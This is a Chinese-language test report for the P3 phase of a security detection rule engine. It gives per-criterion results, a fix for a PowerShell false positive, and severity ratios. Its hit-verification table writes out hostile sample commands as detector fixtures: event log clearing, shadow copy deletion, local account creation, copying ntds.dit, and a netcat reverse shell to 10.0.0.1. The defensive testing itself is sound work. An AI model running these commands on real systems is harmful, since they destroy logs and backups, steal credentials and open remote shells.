# P3 测试文档 — 检测点增强与 exists 扩展

> 阶段：P3（#106）｜ 环节：测试（03-test）
> 配套文档：01-design.md（设计）· 02-dev.md（开发）· 04-verify.md（验证）

---

## 1. 测试策略

1. **新增专项套件** `tests/test_p3_detection_enhancement.py`（19 passed），逐 AC 覆盖 P3-1/P3-2。
2. **存量定向回归**：规则相关 11 个测试文件（`--noconftest` 绕过 torch 原生崩溃）确认 P3 不破坏既有行为。
3. **严重度占比复测**：装载后整体 high 占比 54.6% ≤ 55%（AC-P1-13 不回归）。

---

## 2. 专项套件逐 AC 结果（`test_p3_detection_enhancement.py`）

| AC | 用例 | 验证点 | 结果 |
|---|---|---|---|
| AC-P3-1 | `test_ac_p3_1_file_loaded` | `advanced_detections.json` 存在 + loader 总数 163 + 装载 20 条 | PASS |
| AC-P3-2 | `test_ac_p3_2_active_rules_legal_type` | 16 条 active 全部合法 `rule_type` | PASS |
| AC-P3-7 | `test_ac_p3_7_no_load_error` | loader 无非法类型 | PASS |
| AC-P3-8 | `test_ac_p3_8_severity_ratio` | 整体 high 占比 ≤55%（实测 54.6%） | PASS |
| AC-P3-3 | `test_ac_p3_3_active_fields_in_canonical_model` | active 规则字段均属 canonical 模型 | PASS |
| AC-P3-5 | `test_ac_p3_5_no_active_dead_rule` | active 规则不引用未采集字段 | PASS |
| AC-P3-4 | `test_ac_p3_4_eventlog_clear` 等 8 项 | 抽样规则 `MatcherRegistry.dispatch` 真实命中 + 负向不命中 | PASS |
| AC-P3-6 | `test_ac_p3_6_*` 3 项 | 4 条 exists 兜底 `enabled:false` + `pending_collector` + matcher 惰性正确 | PASS |
| P0-2 回归 | `test_p0_2_event_log_rules_present` / `test_p0_2_dcsync_still_hitl` | 6 条 event_log_summary 仍在 + DCSync 仍 HITL | PASS |

**首轮 1 failed → 已修复**：`test_ac_p3_4_powershell_obfuscated` 负向用例失败，定位为规则缺陷——pattern 中 `-nop` 会匹配 `-NoProfile` 前缀造成误报。移除 `-nop`（保留 `-enc`/`-encodedcommand`/`-w hidden`/`-windowstyle hidden`）后重测全绿。这是真实 FP 修复，已同步回 `advanced_detections.json` 与 01-design.md。

---

## 3. 命中验证明细（AC-P3-4）

| 规则 | 命中样本 | 负向不命中 |
|---|---|---|
| `adv_eventlog_clear` | `wevtutil cl System` | `wevtutil query`；大小写 `WEVTUTIL CL SECURITY` 仍命中 |
| `adv_local_account_create` | `net user alice /add` | `net user alice` |
| `adv_shadow_copy_delete`（composite） | `vssadmin delete shadows /all /quiet` | `vssadmin list shadows`（缺 delete 子条件） |
| `adv_cloud_exfil_domain`（list） | `domain=drive.google.com` | `domain=intranet.local` |
| `adv_powershell_obfuscated` | `powershell -enc JAB...` | `powershell -NoProfile -Command Get-Date`（校准后） |
| `adv_ntds_dit_access`（critical+HITL） | `copy ...\ntds.dit D:\loot` | — |
| `adv_webshell_drop` | `path=...\wwwroot\uploader.aspx` | `path=...\wwwroot\index.html` |
| `adv_reverse_shell_listen` | `nc -e /bin/sh 10.0.0.1 4444` | — |

---

## 4. 严重度占比（AC-P3-8 / AC-P1-13 不回归）

| 阶段 | 总数 | high | high 占比 |
|---|---|---|---|
| P2 末 | 143 | 77 | 53.8% |
| P3 末（初版，未降权） | 163 | 91 | 55.8% ❌ |
| **P3 末（降权 2 条后）** | **163** | **89** | **54.6% ✅** |

---

## 5. 存量定向回归（无 conftest torch 崩溃）

同 P2 策略（`tests/conftest.py` 加载 torch 触发 Windows 原生 access violation，预存环境，与 P3 无关），对规则相关 11 文件 `--noconftest` 复跑：

```
test_rules_import / test_rule_matcher_behavior_fix / test_unified_engine /
test_process_enhancement_p0 / _p1 / _p2 / test_process_detection /
test_attack_chain / test_p2_rule_governance / test_rule_engine_feedback /
test_p3_detection_enhancement
```

**结果（见 04-verify）：零回归。**

---

## 6. 测试状态汇总

| 套件 | 结果 |
|---|---|
| `test_p3_detection_enhancement.py`（新增） | 19 passed |
| 规则相关 11 文件定向回归 | 待 04-verify 填入（预期零回归） |
| P0-2 event_log_summary 规则 | 6 条仍在 + DCSync 仍 HITL ✅ |

结论：**P3 测试通过，无回归，可进入验证环节。**
